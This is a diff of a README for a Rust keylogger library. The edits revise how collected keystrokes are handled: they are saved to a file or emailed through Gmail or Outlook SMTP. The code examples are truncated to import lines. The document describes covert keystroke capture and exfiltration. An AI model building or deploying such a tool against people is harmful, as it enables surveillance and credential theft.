@@ -1,10 +1,10 @@
 # Keylogger in Rust
 
 ## Getting Started
-The Rust Keylogger depends on two objecs, the `Keylogger` struct, and the `Method` enum; which is used to define how to handle a buffer; the buffer being the collected keys that when the max capacity is hit, the keys are then passed onto the handle function from the `Handle` trait.
+The Rust Keylogger depends on two objecs, the `Keylogger` struct, and the `Method` enum, which is used to define how to handle a buffer; the buffer being the collected keystrokes which are then either sent through email or saved in an arbitrary file.
 
 ## Examples
-Initializing a keylogger to write the keystrokes onto a file
+Initializing a keylogger to write the keystrokes into a file
 ```rust
 use std::io::Result;
 use keylogger::{
@@ -21,8 +21,7 @@ fn main() -> Result<()> {
 }
 ```
 
-Initializing a keylogger to send the keystrokes through email; keep in mind that the email **MUST** be an **outlook** email, since the server being used is *smtp-mail.outlook.com*
-
+Initializing a keylogger to send the keystrokes through email. Implemented email domains are *gmail.com* and *outlook.com*.
 ```rust
 use std::io::Result;
 use keylogger::{
